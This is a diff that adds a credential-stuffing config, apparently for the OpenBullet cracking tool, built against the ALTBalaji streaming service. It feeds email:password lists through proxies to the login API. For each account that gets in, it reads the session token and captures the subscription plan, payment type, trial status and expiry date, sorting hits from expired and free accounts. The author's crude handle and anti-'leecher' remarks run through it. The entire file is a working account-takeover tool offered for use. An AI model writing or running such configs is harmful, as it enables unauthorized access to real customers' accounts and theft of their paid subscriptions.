@@ -1,0 +1,117 @@
+[SETTINGS]
+{
+  "Name": "Alt_Balaji_By @joker_ka_baap",
+  "SuggestedBots": 150,
+  "MaxCPM": 0,
+  "LastModified": "2020-12-26T17:45:13.9906007+05:30",
+  "AdditionalInfo": "",
+  "Author": "@joker_ka_baap",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": true,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "FUCKING CPM SHARE SS TOO BY JOKER",
+      "VariableName": "S",
+      "Id": 1754722929
+    }
+  ],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://api.cloud.altbalaji.com/accounts/login?domain=IN" 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Host: api.cloud.altbalaji.com" 
+  HEADER "Origin: https://www.altbalaji.com" 
+  HEADER "Referer: https://www.altbalaji.com/" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Username and password do not match" 
+    KEY "code\":404" 
+    KEY "status\":\"error" 
+  KEYCHAIN Success OR 
+    KEY "status\":\"ok\"" 
+    KEY "session_token\":\"" 
+
+PARSE "<SOURCE>" LR "\",\"session_token\":\"" "\",\"" -> VAR "TOKI" 
+
+mf leecher dont dare to edit it
+
+REQUEST GET "https://payment.cloud.altbalaji.com/accounts/orders?limit=50&domain=IN&latest=true" 
+  
+  HEADER ": scheme: https" 
+  HEADER "accept: application/json, text/plain, */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "origin: https://www.altbalaji.com" 
+  HEADER "referer: https://www.altbalaji.com/" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36" 
+  HEADER "xssession: <TOKI>" 
+
+PARSE "<SOURCE>" LR "\"payment_type\":\"" "\"," CreateEmpty=FALSE -> CAP "payment_type" 
+
+PARSE "<SOURCE>" LR "{\"default\":\"" "\",\"" CreateEmpty=FALSE -> CAP "Plan" 
+
+PARSE "<SOURCE>" LR "is_trial\":" ",\"" CreateEmpty=FALSE -> CAP "Is Trial" 
+
+PARSE "<SOURCE>" LR "valid_to\":\"" "T" CreateEmpty=FALSE -> CAP "Expiry" 
+
+FUNCTION DateToUnixTime "yyyy-MM-dd" "<Expiry>" -> VAR "DAYS_LEFT" 
+
+FUNCTION CurrentUnixTime "S" -> VAR "TIME" 
+
+FUNCTION Constant "@joker_ka_baap" -> CAP "Configs_by" 
+
+KEYCHECK 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "<DAYS_LEFT>" LessThan "<TIME>" 
+  KEYCHAIN Success OR 
+    KEY "<DAYS_LEFT>" GreaterThan "<TIME>" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "{\"orders\":[],\"" 
+
+mf leecher dont dare to edit it
+
